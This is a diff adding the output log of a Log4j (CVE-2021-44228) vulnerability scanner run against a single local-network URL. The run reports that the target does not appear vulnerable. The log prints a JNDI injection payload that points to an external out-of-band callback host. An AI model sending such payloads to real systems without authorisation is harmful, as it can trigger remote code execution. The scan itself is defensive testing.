@@ -1,0 +1,10 @@
+[•] CVE-2021-44228 - Apache Log4j RCE Scanner
+[•] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.
+[•] Secure your External Attack Surface with FullHunt.io.
+[•] Initiating DNS callback server (interact.sh).
+[%] Checking for Log4j RCE CVE-2021-44228.
+[•] URL: http://192.168.1.38:8080/
+[•] URL: http://192.168.1.38:8080/ | PAYLOAD: ${jndi:ldap://192.168.1.38.s820415e9g3y45n7jxgj0956af52n1myf.interact.sh/nbs4adg}
+[•] Payloads sent to all URLs. Waiting for DNS OOB callbacks.
+[•] Waiting...
+[•] Targets do not seem to be vulnerable.
